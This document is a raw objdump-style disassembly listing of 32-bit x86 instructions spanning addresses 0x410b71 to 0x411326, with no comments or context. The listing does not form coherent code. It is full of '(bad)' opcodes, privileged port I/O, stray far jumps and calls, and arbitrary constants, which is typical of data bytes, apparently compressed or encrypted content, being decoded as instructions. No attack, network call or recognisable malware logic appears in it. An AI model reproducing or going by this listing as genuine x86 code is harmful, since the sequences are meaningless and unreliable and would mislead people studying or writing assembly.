  410b71:	add    BYTE PTR ds:0x896f9671,ah
  410b77:	or     al,0xd
  410b79:	jecxz  0x410b2c
  410b7b:	sub    ebx,DWORD PTR [ecx-0x28]
  410b7e:	cmc    
  410b7f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410b80:	out    0x8d,al
  410b82:	(bad)  
  410b83:	test   al,0x82
  410b85:	jmp    0x4493:0xce02f086
  410b8c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410b8d:	jecxz  0x410b32
  410b8f:	sbb    dh,BYTE PTR [ebx-0x21]
  410b92:	fdiv   st(6),st
  410b94:	lahf   
  410b95:	mov    dh,0xf0
  410b97:	jno    0x410bcb
  410b99:	lahf   
  410b9a:	dec    esi
  410b9b:	xlat   BYTE PTR ds:[ebx]
  410b9c:	scas   eax,DWORD PTR es:[edi]
  410b9d:	retf   
  410b9e:	mov    ecx,?
  410ba0:	cli    
  410ba1:	mov    bl,0xb5
  410ba3:	(bad)  
  410ba4:	(bad)  
  410ba5:	(bad)  
  410ba6:	mov    ecx,0x2ad210be
  410bab:	in     eax,0xc
  410bad:	call   0xd9ce:0x2ec57e95
  410bb4:	lock leave 
  410bb6:	cwde   
  410bb7:	or     DWORD PTR [edx],edi
  410bb9:	sti    
  410bba:	add    al,0x14
  410bbc:	mov    al,0x75
  410bbe:	xchg   ebp,eax
  410bbf:	push   ebx
  410bc0:	xchg   esp,eax
  410bc1:	sub    edx,DWORD PTR [ecx]
  410bc3:	ss mov bl,ah
  410bc6:	jne    0x410baf
  410bc8:	sbb    al,0xf9
  410bca:	sub    eax,0xd16d5ebd
  410bcf:	scas   eax,DWORD PTR es:[edi]
  410bd0:	inc    edx
  410bd1:	mov    edi,0x734ece46
  410bd6:	scas   eax,DWORD PTR es:[edi]
  410bd7:	mov    esi,0xb8b62306
  410bdc:	add    BYTE PTR ss:[eax+ecx*1-0x3e468369],cl
  410be4:	xor    eax,0x6c2a4e40
  410be9:	mov    eax,DWORD PTR [esi+0x4f662f3a]
  410bef:	inc    eax
  410bf0:	jecxz  0x410c02
  410bf2:	push   esi
  410bf3:	mov    eax,ds:0xb4bc39dd
  410bf8:	leave  
  410bf9:	stos   BYTE PTR es:[edi],al
  410bfa:	aaa    
  410bfb:	ins    DWORD PTR es:[edi],dx
  410bfc:	mov    edi,0x4d69f1a4
  410c01:	pop    esp
  410c02:	fs repz ret 0x246f
  410c07:	repz sbb esi,DWORD PTR [ebx+0x390b2ee8]
  410c0e:	mov    al,ah
  410c10:	mov    al,ds:0x9bc13ee8
  410c15:	lods   al,BYTE PTR ds:[esi]
  410c16:	push   esi
  410c17:	aaa    
  410c18:	xchg   ebp,eax
  410c19:	sub    BYTE PTR [esi+0x7928bed6],ch
  410c1f:	push   ebp
  410c20:	popa   
  410c21:	mov    al,0xaa
  410c23:	add    al,0xa3
  410c25:	popf   
  410c26:	les    ebp,FWORD PTR [ecx-0x1f491d53]
  410c2c:	mov    eax,ds:0x52fc4668
  410c31:	std    
  410c32:	ja     0x410c06
  410c34:	mov    eax,ds:0xe4045edd
  410c39:	retf   
  410c3a:	cdq    
  410c3b:	pop    ds
  410c3c:	loopne 0x410c58
  410c3e:	pop    ebp
  410c3f:	push   cs
  410c40:	dec    ebx
  410c41:	inc    ecx
  410c42:	clc    
  410c43:	sar    eax,0xf
  410c46:	cs ss push 0x9a176085
  410c4d:	mov    esi,0xa73b0046
  410c52:	jl     0x410c6c
  410c54:	add    edx,edx
  410c56:	test   BYTE PTR [esi-0x1ef2821f],dl
  410c5c:	pop    ecx
  410c5d:	add    ebp,esi
  410c5f:	mov    edi,0x74d6df41
  410c64:	mov    eax,ds:0x52ecd91a
  410c69:	pushf  
  410c6a:	dec    ebp
  410c6b:	jmp    0x410ccb
  410c6d:	mov    ah,0x82
  410c6f:	mov    ebx,0x8d66ab59
  410c74:	dec    ebx
  410c75:	mov    eax,ds:0xd16e5bb
  410c7a:	pushf  
  410c7b:	cmp    BYTE PTR [ebp+0x60],bh
  410c7e:	pop    ebp
  410c7f:	xchg   esp,eax
  410c80:	mov    ah,0x8a
  410c82:	jnp    0x410c30
  410c84:	xchg   ebp,eax
  410c85:	in     al,0x43
  410c87:	cld    
  410c88:	jecxz  0x410cc7
  410c8a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410c8b:	out    dx,eax
  410c8c:	or     bh,BYTE PTR [ebx+0x6253b2c3]
  410c92:	lods   al,BYTE PTR ds:[esi]
  410c93:	mov    esi,0xed95f2cd
  410c98:	adc    edi,ebx
  410c9a:	call   0x6e6fc930
  410c9f:	jmp    0xeff0953d
  410ca4:	adc    al,0x84
  410ca6:	lds    eax,FWORD PTR [ebx]
  410ca8:	mov    ebx,esp
  410caa:	xchg   DWORD PTR [ebx],ebx
  410cac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410cad:	sbb    edx,ecx
  410caf:	dec    ebx
  410cb0:	stos   BYTE PTR es:[edi],al
  410cb1:	mov    BYTE PTR [eax-0x30],0x91
  410cb5:	cmp    edi,DWORD PTR [edx-0x27]
  410cb8:	inc    ebp
  410cb9:	into   
  410cba:	daa    
  410cbb:	mov    esp,es
  410cbd:	jnp    0x410c97
  410cbf:	daa    
  410cc0:	cmp    BYTE PTR [ebp-0x3f],dl
  410cc3:	sbb    cl,BYTE PTR [esi]
  410cc5:	inc    ebp
  410cc6:	xchg   edx,eax
  410cc7:	leave  
  410cc8:	push   esp
  410cc9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410cca:	imul   ecx,DWORD PTR [ecx],0xd83dfd07
  410cd0:	sbb    eax,0xb259dce8
  410cd5:	and    DWORD PTR [ebx+0x38],ebp
  410cd8:	lds    ebx,FWORD PTR [edx-0x2e6d4777]
  410cde:	jg     0x410c63
  410ce0:	cmc    
  410ce1:	adc    ch,ah
  410ce3:	jbe    0x410d27
  410ce5:	inc    ecx
  410ce6:	push   edi
  410ce7:	cmc    
  410ce8:	stos   DWORD PTR es:[edi],eax
  410ce9:	arpl   bp,bp
  410ceb:	cmc    
  410cec:	fdivr  st(3),st
  410cee:	pop    edx
  410cef:	dec    esp
  410cf0:	test   esp,esp
  410cf2:	mov    al,0x42
  410cf4:	cmp    eax,0x2b596d60
  410cf9:	mov    WORD PTR [ecx+0x18bfae62],ds
  410cff:	cmp    ebp,DWORD PTR [edx]
  410d01:	cs mov bh,0x92
  410d04:	sbb    DWORD PTR [edi],ebx
  410d06:	(bad)  
  410d07:	ja     0x902ad88a
  410d0d:	xchg   esi,eax
  410d0e:	imul   edx,DWORD PTR [esi+esi*1-0x62],0xde2f75d1
  410d16:	(bad)  
  410d17:	enter  0x6068,0x55
  410d1b:	jecxz  0x410cb5
  410d1d:	or     eax,DWORD PTR [esi-0x7635daab]
  410d23:	sub    al,0x25
  410d25:	and    eax,0x80089cbf
  410d2a:	inc    eax
  410d2b:	mov    dl,0xca
  410d2d:	sahf   
  410d2e:	dec    ecx
  410d2f:	sbb    al,0xf6
  410d31:	(bad)  
  410d33:	ds test eax,0x3c02a41e
  410d39:	push   cs
  410d3a:	jne    0x410d99
  410d3c:	in     eax,0x1d
  410d3e:	js     0x410ce8
  410d40:	jb     0x410d57
  410d42:	sti    
  410d43:	repz jnp 0x410cf4
  410d46:	ss push edx
  410d48:	push   ds
  410d49:	sub    edi,DWORD PTR [esi+0x66]
  410d4c:	pop    ebp
  410d4d:	test   al,0xbf
  410d4f:	cmp    BYTE PTR [eax],0x79
  410d52:	shr    BYTE PTR [ecx-0x17638856],cl
  410d58:	jp     0x410d6f
  410d5a:	cmp    eax,0x75afd47
  410d5f:	cmp    BYTE PTR [esi],dh
  410d61:	mov    es,WORD PTR ds:0xec28d7bd
  410d67:	inc    esi
  410d68:	lods   eax,DWORD PTR ds:[esi]
  410d69:	cmp    al,0x13
  410d6b:	mov    al,ds:0xf49796f6
  410d70:	inc    ecx
  410d71:	mov    WORD PTR [ebx],ds
  410d73:	popa   
  410d74:	pusha  
  410d75:	clc    
  410d76:	data16 mov bh,0xdf
  410d79:	mov    DWORD PTR [edx+0x38],ecx
  410d7c:	or     bl,BYTE PTR [esi-0x3bcc926]
  410d82:	cdq    
  410d83:	mov    ds:0x4f050ac4,al
  410d88:	pop    edx
  410d89:	xor    BYTE PTR [esi],al
  410d8b:	cmp    esi,ebp
  410d8d:	pop    esi
  410d8e:	fidivr WORD PTR [edx+0x14]
  410d91:	pop    ecx
  410d92:	pop    eax
  410d93:	push   0x52
  410d95:	adc    al,0x1b
  410d97:	mov    dl,0x47
  410d99:	enter  0xa9a,0x12
  410d9d:	cs iret 
  410d9f:	ret    0x3b52
  410da2:	xor    ecx,DWORD PTR ds:0xa582ba4c
  410da8:	jo     0x410d79
  410daa:	int    0xe
  410dac:	pop    ebp
  410dad:	mov    BYTE PTR [eax+0x1cccefab],al
  410db3:	lahf   
  410db4:	jo     0x410d90
  410db6:	adc    ecx,edx
  410db8:	lods   al,BYTE PTR ds:[esi]
  410db9:	inc    edx
  410dba:	sub    eax,0xb77209e2
  410dbf:	ja     0x410dd0
  410dc1:	outs   dx,DWORD PTR es:[esi]
  410dc3:	jno    0x410e3e
  410dc5:	push   ebx
  410dc6:	xor    ah,BYTE PTR [edx+esi*1]
  410dc9:	push   ds
  410dca:	int3   
  410dcb:	out    dx,eax
  410dcc:	or     eax,0x298497ed
  410dd1:	jbe    0x410e1e
  410dd3:	push   cs
  410dd4:	adc    BYTE PTR [ebx+0x50],0xa3
  410dd8:	jns    0x410dad
  410dda:	push   edx
  410ddb:	repnz push 0x2b6c788a
  410de1:	xor    al,0x38
  410de3:	xlat   BYTE PTR ds:[ebx]
  410de4:	das    
  410de5:	dec    ecx
  410de6:	jmp    DWORD PTR [esi-0x2a]
  410de9:	je     0x410e5b
  410deb:	cmp    DWORD PTR [ebx-0x74],esp
  410dee:	add    eax,DWORD PTR [esi+ecx*1]
  410df1:	mov    edi,0xbfe24726
  410df6:	das    
  410df7:	inc    edi
  410df8:	push   ss
  410df9:	(bad)  
  410dfb:	outs   dx,DWORD PTR ds:[esi]
  410dfc:	sbb    al,0x27
  410dfe:	js     0x410e61
  410e00:	xchg   ecx,eax
  410e01:	pop    es
  410e02:	gs dec esi
  410e04:	inc    ebx
  410e05:	fadd   QWORD PTR [ebx+eax*8-0x4354def4]
  410e0c:	pop    ss
  410e0d:	loopne 0x410dd5
  410e0f:	dec    edi
  410e10:	das    
  410e11:	mov    ecx,0x4d27a766
  410e16:	jl     0x410e2a
  410e18:	xor    al,0xfc
  410e1a:	lds    ecx,FWORD PTR [edi+0xa]
  410e1d:	push   0xdd507f19
  410e22:	and    eax,0xe833336c
  410e27:	ja     0x410e1a
  410e29:	rcr    DWORD PTR [eax],1
  410e2b:	mov    ebp,0x62dfb9b2
  410e30:	icebp  
  410e31:	cmp    al,cl
  410e33:	mov    edi,0x4f8722be
  410e38:	sbb    ecx,edi
  410e3a:	and    DWORD PTR [ecx-0x31777690],ebx
  410e40:	adc    eax,0x6919a9f4
  410e45:	sar    BYTE PTR [eax],cl
  410e47:	fcomp  DWORD PTR [eax]
  410e49:	xor    BYTE PTR ds:0xc8168759,dl
  410e4f:	fmul   QWORD PTR [eax+0x1ff27e5a]
  410e55:	xchg   DWORD PTR [esi-0x4a],esp
  410e58:	xor    BYTE PTR [ebp-0x39],ch
  410e5b:	sbb    ecx,esi
  410e5d:	mov    al,ds:0xff7c1f16
  410e62:	xchg   esp,eax
  410e63:	jb     0x410e66
  410e65:	or     dh,BYTE PTR [edx+0x70c7719e]
  410e6b:	std    
  410e6c:	dec    esi
  410e6d:	and    al,0x57
  410e6f:	(bad)  [edi+0x58]
  410e72:	sbb    edi,DWORD PTR [ebx+ecx*2-0x137fd836]
  410e79:	xchg   cl,bh
  410e7b:	jno    0x410e47
  410e7d:	call   0xe8a16626
  410e82:	lock ja 0x410f00
  410e85:	xchg   ebx,eax
  410e86:	hlt    
  410e87:	xlat   BYTE PTR ds:[ebx]
  410e88:	loop   0x410ea2
  410e8a:	jmp    0x6af5:0x39f3d2b3
  410e91:	xor    esp,esp
  410e93:	aam    0x44
  410e95:	mov    eax,ds:0xa0761047
  410e9a:	xchg   BYTE PTR [esi],ch
  410e9c:	pop    es
  410e9d:	pop    ebx
  410e9e:	in     al,0x33
  410ea0:	xchg   esi,eax
  410ea1:	sbb    edx,eax
  410ea3:	push   ebx
  410ea4:	cmp    al,0x87
  410ea6:	xor    al,0x2f
  410ea8:	jmp    0x410e92
  410eaa:	cs inc ebx
  410ead:	pusha  
  410eae:	mov    dh,0xff
  410eb0:	and    BYTE PTR [edx+ebx*8-0x27e4739b],al
  410eb7:	aaa    
  410eb8:	in     al,0x47
  410eba:	(bad)  
  410ebb:	jae    0x410ec9
  410ebd:	dec    edx
  410ebe:	pushf  
  410ebf:	fwait
  410ec0:	or     al,0xf6
  410ec2:	ds fxtract 
  410ec5:	xchg   edi,eax
  410ec6:	or     al,0xff
  410ec8:	ins    DWORD PTR es:[edi],dx
  410ec9:	inc    esi
  410eca:	ret    
  410ecb:	and    esi,edx
  410ecd:	int    0x65
  410ecf:	inc    ecx
  410ed0:	push   es
  410ed1:	jge    0x410ec8
  410ed3:	lahf   
  410ed4:	xchg   edx,eax
  410ed5:	mov    bh,0x35
  410ed7:	rcr    DWORD PTR [edx+ecx*4],cl
  410eda:	jne    0x410ea3
  410edc:	push   edi
  410edd:	js     0x410e8c
  410edf:	pop    ds
  410ee0:	jle    0x410eff
  410ee2:	mov    ah,cl
  410ee4:	mov    eax,0x48bcae2e
  410ee9:	fist   WORD PTR [edi+0xb]
  410eec:	gs cmp eax,0xea3a309f
  410ef2:	jmp    0x410f6e
  410ef4:	ja     0x410e7c
  410ef6:	xchg   DWORD PTR [ecx+0x21],ebx
  410ef9:	adc    al,0x13
  410efb:	mov    ch,0x3d
  410efd:	rol    BYTE PTR ds:0x42cbe1d9,cl
  410f03:	shl    BYTE PTR [edx+0x3c7b34cd],1
  410f09:	pop    ebx
  410f0a:	sbb    ch,BYTE PTR [esp+ebp*4+0x2419a7c]
  410f11:	int3   
  410f12:	shl    DWORD PTR [ebx-0xa],cl
  410f15:	mov    esi,0x70a19472
  410f1a:	dec    ecx
  410f1b:	jns    0x410f59
  410f1d:	lock sub al,0xdc
  410f20:	and    DWORD PTR [eax],edx
  410f22:	lods   al,BYTE PTR ds:[esi]
  410f23:	rol    BYTE PTR [eax-0x1b],0xb4
  410f27:	jne    0x410f64
  410f29:	or     ah,dh
  410f2b:	scas   eax,DWORD PTR es:[edi]
  410f2c:	mov    ecx,0xca0fd3cc
  410f31:	shl    esp,1
  410f33:	sar    bh,cl
  410f35:	and    ah,BYTE PTR [eax]
  410f37:	scas   al,BYTE PTR es:[edi]
  410f38:	clc    
  410f39:	scas   eax,DWORD PTR es:[edi]
  410f3a:	push   edx
  410f3b:	outs   dx,BYTE PTR ds:[esi]
  410f3c:	push   cs
  410f3d:	out    0x57,eax
  410f3f:	ins    DWORD PTR es:[edi],dx
  410f40:	aad    0xca
  410f42:	clc    
  410f43:	jo     0x410f40
  410f45:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410f46:	vcvtsi2sd xmm2,xmm1,DWORD PTR [ecx-0x28]
  410f4b:	clc    
  410f4c:	leave  
  410f4d:	sbb    BYTE PTR [ebx+0x5e],ch
  410f50:	sub    edx,DWORD PTR [ebx+ebp*4]
  410f53:	xchg   ebp,eax
  410f54:	mov    WORD PTR [ecx+eax*1+0x4fea711f],gs
  410f5b:	rcr    DWORD PTR [edi],1
  410f5d:	mov    ebx,0x4da7ae0d
  410f62:	push   esi
  410f63:	ret    
  410f64:	stc    
  410f65:	xor    al,0xa8
  410f67:	adc    ebp,DWORD PTR [ebp+0x4b]
  410f6a:	cs (bad) 
  410f6c:	jmp    0x410fb0
  410f6e:	push   0xb7efe73
  410f73:	(bad)  
  410f74:	test   DWORD PTR [edi+eax*2+0x163f7920],0xfca842e0
  410f7f:	pop    ebx
  410f80:	push   eax
  410f81:	(bad)  
  410f82:	in     eax,dx
  410f83:	push   0x9
  410f85:	ins    DWORD PTR es:[edi],dx
  410f86:	mov    ah,0x69
  410f88:	cmp    BYTE PTR [eax],bl
  410f8a:	outs   dx,DWORD PTR ds:[esi]
  410f8b:	in     eax,dx
  410f8c:	mov    bh,0x9d
  410f8e:	and    al,0x78
  410f90:	ror    DWORD PTR [eax+eiz*4],1
  410f93:	jbe    0x410ff6
  410f95:	adc    dl,bh
  410f97:	test   BYTE PTR [eax+0x2b],ah
  410f9a:	sbb    esp,DWORD PTR [ecx+0x697bd706]
  410fa0:	inc    edx
  410fa1:	xchg   ebp,eax
  410fa2:	add    esi,DWORD PTR [ecx-0x7bcdfe8b]
  410fa8:	xor    al,0xf
  410faa:	shl    ah,0x4a
  410fad:	sbb    ecx,esp
  410faf:	jg     0x410f70
  410fb1:	jo     0x410f44
  410fb3:	dec    edx
  410fb4:	shl    BYTE PTR [ecx+0xf],0x1d
  410fb8:	sub    esi,0x5a
  410fbb:	mov    cl,0x97
  410fbd:	adc    DWORD PTR [esi],ebx
  410fbf:	mov    eax,0xac49667f
  410fc4:	sbb    BYTE PTR [edx+0x45],dl
  410fc7:	sahf   
  410fc8:	jb     0x410ff2
  410fca:	in     al,0xba
  410fcc:	pusha  
  410fcd:	in     al,dx
  410fce:	mov    gs,edx
  410fd0:	add    DWORD PTR [ecx+0xf],ecx
  410fd3:	test   BYTE PTR [edi+esi*2+0x2dafa3ce],ch
  410fda:	ins    DWORD PTR es:[edi],dx
  410fdb:	push   ebx
  410fdc:	fwait
  410fdd:	cs mov al,0xd3
  410fe0:	loope  0x410fa2
  410fe2:	aad    0x90
  410fe4:	dec    edx
  410fe5:	not    bh
  410fe7:	sar    DWORD PTR [esp+eax*8+0x2f89509b],0x93
  410fef:	into   
  410ff0:	mov    cl,0x70
  410ff2:	pop    ss
  410ff3:	sub    al,0xa6
  410ff5:	(bad)  
  410ff7:	das    
  410ff8:	mov    cl,BYTE PTR ds:0xebf67ca2
  410ffe:	mov    esi,0x47094881
  411003:	add    edi,0x6c
  411006:	icebp  
  411007:	or     al,0xca
  411009:	cs in  al,0xfe
  41100c:	mov    ecx,0x17721af8
  411011:	pop    eax
  411012:	push   ebx
  411013:	push   ebx
  411014:	and    al,0x4a
  411016:	call   0x869366b9
  41101b:	jo     0x411012
  41101d:	mov    ds:0xe193789a,al
  411022:	mov    WORD PTR [ecx],ss
  411024:	cmp    DWORD PTR [ecx-0x14d08b3e],esi
  41102a:	sub    bl,dl
  41102c:	xchg   esp,eax
  41102d:	outs   dx,BYTE PTR ds:[esi]
  41102e:	or     dl,dl
  411030:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  411032:	add    BYTE PTR [esi+0x1e],0x6d
  411036:	mov    edx,0xe31285aa
  41103b:	push   edi
  41103c:	dec    esp
  41103d:	add    eax,0xe258f652
  411042:	fs movd mm2,eax
  411046:	pop    eax
  411047:	sbb    cl,BYTE PTR [esi]
  411049:	and    DWORD PTR [edx],0xffffffd3
  41104c:	adc    dl,BYTE PTR [edi-0x23e120b3]
  411052:	retf   0xa460
  411055:	dec    edx
  411056:	mov    dl,dh
  411058:	xor    ebp,ebx
  41105a:	pop    edi
  41105b:	add    esi,esp
  41105d:	cmp    al,0x63
  41105f:	(bad)  
  411060:	(bad)  
  411061:	fcom   DWORD PTR [ebp-0x4bcd5160]
  411067:	mov    ch,0x4f
  411069:	adc    ecx,DWORD PTR [ebx]
  41106b:	mul    BYTE PTR [ecx+0x61]
  41106e:	inc    esi
  41106f:	xchg   DWORD PTR [edx+0x7],ebp
  411072:	(bad)  
  411073:	push   esp
  411074:	(bad)  
  411075:	lods   eax,DWORD PTR ds:[esi]
  411076:	and    bh,BYTE PTR [ebp-0x60ec7f45]
  41107c:	(bad)  
  41107d:	cdq    
  41107e:	adc    bh,BYTE PTR [edi+0x4cab9032]
  411084:	ror    DWORD PTR [ebx+0x5820626c],cl
  41108a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41108b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41108c:	inc    esi
  41108d:	or     bh,0x29
  411090:	add    ax,0x7f91
  411094:	jmp    0x4110cc
  411096:	pop    esi
  411097:	or     eax,0x3aa61d5b
  41109c:	imul   esp,DWORD PTR [ebx],0xa19be65
  4110a2:	adc    eax,0x64239ef9
  4110a7:	fcom   DWORD PTR [edx]
  4110a9:	mov    cl,0x41
  4110ab:	sbb    ch,BYTE PTR [ebx+ebx*4+0x33]
  4110af:	pop    edx
  4110b0:	mov    dh,dl
  4110b2:	push   ecx
  4110b3:	(bad)  [ebx-0x3d]
  4110b6:	jne    0x411086
  4110b8:	inc    eax
  4110b9:	dec    ebp
  4110ba:	and    esp,ebp
  4110bc:	jg     0x411134
  4110be:	jge    0x41113d
  4110c0:	xor    DWORD PTR [edx-0x18],ecx
  4110c3:	inc    esp
  4110c4:	fldcw  WORD PTR [ecx-0x7281ea84]
  4110ca:	bound  edx,QWORD PTR [edi+0x3d]
  4110cd:	mov    bl,0x88
  4110cf:	jle    0x411143
  4110d1:	xor    al,0x5c
  4110d3:	into   
  4110d4:	fbstp  TBYTE PTR [eax]
  4110d6:	call   0x86d4:0xca69730d
  4110dd:	xor    bh,BYTE PTR [esi+0x54]
  4110e0:	jecxz  0x41111b
  4110e2:	or     al,0xbc
  4110e4:	(bad)  
  4110e5:	cmc    
  4110e6:	and    BYTE PTR ds:0xe7c5c5a0,dh
  4110ec:	inc    edi
  4110ed:	ins    BYTE PTR es:[edi],dx
  4110ee:	mov    bl,0x83
  4110f0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4110f1:	fnstsw WORD PTR [edx]
  4110f3:	cmp    eax,0xda5d1e9d
  4110f8:	add    eax,0x1785aa42
  4110fd:	pop    eax
  4110fe:	es pop eax
  411100:	sub    al,0x2e
  411102:	repz fcmovnbe st,st(6)
  411105:	stos   BYTE PTR es:[edi],al
  411106:	cmc    
  411107:	sub    esi,eax
  411109:	test   BYTE PTR cs:[ecx-0x6fb8b846],al
  411110:	out    0x68,eax
  411112:	es sub eax,0xfc8642b7
  411118:	cmp    edi,DWORD PTR [ecx]
  41111a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41111b:	sub    BYTE PTR [esi],bh
  41111d:	ds push 0xa142eabd
  411123:	mov    ebx,0xdbbbbda1
  411128:	dec    eax
  411129:	pop    ebp
  41112a:	mov    dh,0xfc
  41112c:	sub    ch,BYTE PTR [ebx+0x1ed839cf]
  411132:	bound  eax,QWORD PTR [eax+0x3d]
  411135:	pusha  
  411136:	adc    al,BYTE PTR [edi]
  411138:	in     eax,0xf2
  41113a:	xchg   edx,eax
  41113b:	jle    0x4110eb
  41113d:	jnp    0x41117e
  41113f:	loopne 0x411165
  411141:	clc    
  411142:	fnstsw WORD PTR [edx+0x2d]
  411145:	in     eax,dx
  411146:	repnz aad 0xa
  411149:	daa    
  41114a:	jno    0x411199
  41114c:	pop    ebx
  41114d:	ins    DWORD PTR es:[edi],dx
  41114e:	adc    DWORD PTR [ecx],0x79cf5ad4
  411154:	or     edx,DWORD PTR [edi]
  411156:	rcr    DWORD PTR [ebp+0x47],1
  411159:	sbb    BYTE PTR [edi-0x3d],ch
  41115c:	ret    0x6649
  41115f:	fst    QWORD PTR [edx+0x38]
  411162:	cmp    eax,0xbc9d209a
  411167:	mov    al,0x57
  411169:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41116a:	jecxz  0x4111ae
  41116c:	add    ch,BYTE PTR [esi-0x22]
  41116f:	das    
  411170:	lods   al,BYTE PTR ds:[esi]
  411171:	outs   dx,BYTE PTR ds:[esi]
  411172:	hlt    
  411173:	jno    0x4111c0
  411175:	sub    eax,0xf0252640
  41117a:	sbb    eax,0x1933ed16
  41117f:	sub    eax,0xd470349a
  411184:	cmp    esp,DWORD PTR [edi+0x710f36f4]
  41118a:	fstp   DWORD PTR [ecx-0x1099c09c]
  411190:	push   0x55
  411192:	mov    ds:0xf5855592,al
  411197:	cdq    
  411198:	and    DWORD PTR [ebp+0x4c6f6c79],ebx
  41119e:	test   al,0x82
  4111a0:	and    DWORD PTR [edx+0x40c8a04f],eax
  4111a6:	call   0x6298b90f
  4111ab:	lods   al,BYTE PTR ds:[esi]
  4111ac:	mov    cl,BYTE PTR [ebp-0x2897e228]
  4111b2:	mov    ds:0xba771912,eax
  4111b7:	addr16 fwait
  4111b9:	pop    edi
  4111ba:	jb     0x4111e0
  4111bc:	imul   ebx,DWORD PTR [esi],0xffffff8e
  4111bf:	mov    dh,0x8
  4111c1:	fwait
  4111c2:	mov    DWORD PTR [edx],edi
  4111c4:	fadd   QWORD PTR [ecx-0x3f57ad34]
  4111ca:	mov    cl,0xaa
  4111cc:	sbb    BYTE PTR [ebp-0x4],dl
  4111cf:	mov    ch,0xa
  4111d1:	jle    0x4111c9
  4111d3:	push   0xfffffff0
  4111d5:	lods   eax,DWORD PTR ds:[esi]
  4111d6:	sub    BYTE PTR [eax],0x6e
  4111d9:	inc    ecx
  4111da:	cmp    dh,BYTE PTR [eax+0x24]
  4111dd:	push   cs
  4111de:	int    0x85
  4111e0:	xlat   BYTE PTR ds:[ebx]
  4111e1:	push   esp
  4111e2:	dec    eax
  4111e3:	rcl    BYTE PTR [ebp-0x3cc0b046],1
  4111e9:	push   0x99bedfe4
  4111ee:	shr    DWORD PTR [eax-0x5ecbf127],0x6d
  4111f5:	shl    BYTE PTR [edi+eax*4-0x240f243c],cl
  4111fc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4111fd:	cli    
  4111fe:	jge    0x4111a7
  411200:	mov    BYTE PTR [esi-0x937c15f],ch
  411206:	mov    fs,WORD PTR [edx-0x702abf61]
  41120c:	push   ebx
  41120d:	pusha  
  41120e:	xchg   edx,eax
  41120f:	pop    ebp
  411210:	adc    eax,DWORD PTR [eax-0x40c56b65]
  411216:	lea    ecx,[esi]
  411218:	dec    edi
  411219:	iret   
  41121a:	popf   
  41121b:	cmp    al,0xde
  41121d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41121e:	fdiv   st(2),st
  411220:	xor    eax,0x27719a90
  411225:	xor    eax,0x2f3c269
  41122a:	ss jp  0x4111ca
  41122d:	stos   DWORD PTR es:[edi],eax
  41122e:	xchg   ebp,eax
  41122f:	clc    
  411230:	and    eax,0x462d9307
  411235:	clc    
  411236:	or     DWORD PTR [esi],ebx
  411238:	clc    
  411239:	mov    ebp,0x6479078a
  41123e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41123f:	cmp    DWORD PTR [esi+0x21f744d2],ebp
  411245:	or     ebp,DWORD PTR [edi+ebx*4-0x43]
  411249:	mov    esp,0x55c9f51f
  41124e:	shl    bl,cl
  411250:	and    DWORD PTR [ecx+0x4aea0537],edx
  411256:	lea    eax,[ebx+0xa]
  411259:	ficom  WORD PTR [ecx-0x28dc8d48]
  41125f:	jecxz  0x4111fe
  411261:	fiadd  WORD PTR [ebx+0xd]
  411264:	clc    
  411265:	shl    BYTE PTR ds:[eax-0x50879275],0xa7
  41126d:	mov    bh,0xfc
  41126f:	lods   eax,DWORD PTR ds:[esi]
  411270:	jecxz  0x41123a
  411272:	jp     0x41120a
  411274:	cmp    cl,BYTE PTR [edx-0x47]
  411277:	add    ebx,esi
  411279:	imul   esi,DWORD PTR [esi+0xc],0xffffffbd
  41127d:	mov    al,ds:0x5a7dea61
  411282:	cmp    al,0x57
  411284:	sub    edi,DWORD PTR [ebp+eiz*4+0x60]
  411288:	mov    cs,WORD PTR [esi+eiz*4+0x3fa07600]
  41128f:	mov    ebx,0xc9f9444a
  411294:	xor    DWORD PTR [eax+eiz*2],0x24bfd8fa
  41129b:	and    bl,dh
  41129d:	mov    cl,0x4b
  41129f:	fs aad 0xe4
  4112a2:	rcr    edi,cl
  4112a4:	sub    DWORD PTR [esi],esi
  4112a6:	sar    BYTE PTR [edx-0x41],cl
  4112a9:	bound  ebp,QWORD PTR [ecx-0x59cd6ac6]
  4112af:	inc    ebx
  4112b0:	adc    DWORD PTR [eax+0x142b500d],ebx
  4112b6:	repz test DWORD PTR [esi-0x404787df],ebx
  4112bd:	fldcw  WORD PTR [esi+esi*8]
  4112c0:	add    sp,bx
  4112c3:	imul   edi,esi,0x19
  4112c6:	scas   al,BYTE PTR es:[edi]
  4112c7:	std    
  4112c8:	fs adc edi,ebp
  4112cb:	cmp    BYTE PTR [edi+0x64],dl
  4112ce:	and    esi,DWORD PTR [edi+edx*8-0x448b16a9]
  4112d5:	cmp    al,0x4f
  4112d7:	jmp    0x70b7:0x9fc23eb4
  4112de:	inc    edx
  4112df:	adc    al,0x4f
  4112e1:	(bad)  
  4112e2:	out    0x9,al
  4112e4:	stos   BYTE PTR es:[edi],al
  4112e5:	sub    al,0xea
  4112e7:	cmp    dh,BYTE PTR [esi-0x7928052c]
  4112ed:	lock sbb eax,0x606ac4b7
  4112f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4112f4:	(bad)  
  4112f5:	test   DWORD PTR [ebp-0x3d40e774],0x55d9c908
  4112ff:	sub    bh,BYTE PTR [ebx+ebx*8-0x69eeb5a0]
  411306:	dec    ebx
  411307:	popf   
  411308:	jb     0x411385
  41130a:	sbb    ecx,DWORD PTR [ebp+0x79a451cb]
  411310:	mov    eax,0xe6d954c9
  411315:	cmp    al,0x83
  411317:	dec    eax
  411318:	jno    0x41132e
  41131a:	clc    
  41131b:	mov    esp,0xcfbda55b
  411320:	xchg   ebx,eax
  411321:	sub    eax,0x1010c029
  411326:	add    edx,edi
